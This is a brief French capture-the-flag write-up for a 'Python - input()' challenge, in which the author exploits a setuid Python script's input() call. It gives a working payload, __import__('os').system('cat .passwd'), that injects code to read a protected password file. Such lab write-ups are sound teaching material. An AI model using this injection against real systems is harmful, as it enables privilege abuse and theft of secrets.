# Python - input()
## 20 Points
### Donnez à manger au python !

## Énoncé

Obtenez le mot de passe contenu dans le fichier .passwd en exploitant la vulnérabilité de ce script python.

## Solution

L'objection de ce challenge est d'utiliser l'input dans le fichier **ch6.py** dans l'objectif de lui faire faire:
```bash
cat .passwd
```

Pour cela rien de plus simple, il faut tout simplement lui envoyer du code en python en tant qu'input, mais pas de n'importe quelle façon:
```bash
echo "__import__('os').system('cat .passwd')" | ./setuid-wrapper
[censorship]
Please enter password :
```

Et voilà, nous avons le flag !